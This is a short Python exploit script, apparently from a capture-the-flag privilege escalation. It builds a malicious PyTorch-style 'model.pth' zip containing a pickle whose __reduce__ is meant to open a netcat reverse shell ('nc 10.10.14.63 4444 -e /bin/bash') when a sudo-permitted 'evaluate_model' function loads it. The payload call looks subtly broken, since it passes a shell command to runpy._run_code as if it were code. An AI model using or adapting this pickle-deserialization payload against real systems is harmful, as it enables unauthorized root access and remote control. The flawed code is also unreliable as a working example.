### Python script that outputs a .pth file in order to activate privilege escalation
### using 'evaluate_model' function from sudo -l

import pickle
import zipfile
import os
import runpy


class PickleRick:
    def __reduce__(self):
        return (runpy._run_code, ('nc 10.10.14.63 4444 -e /bin/bash'), {})


def create_zip(name: str) -> None:
    if os.path.isfile(name):
        os.remove(name)

    with zipfile.ZipFile(name, mode="w") as z:
        with z.open("models/version", "w") as f:
            f.write(b"3")
        with z.open("models/data.pkl", "w") as f:
            f.write(pickle.dumps(PickleRick()))


def main() -> None:
    create_zip("model.pth")
    return


if __name__ == "__main__":
    main()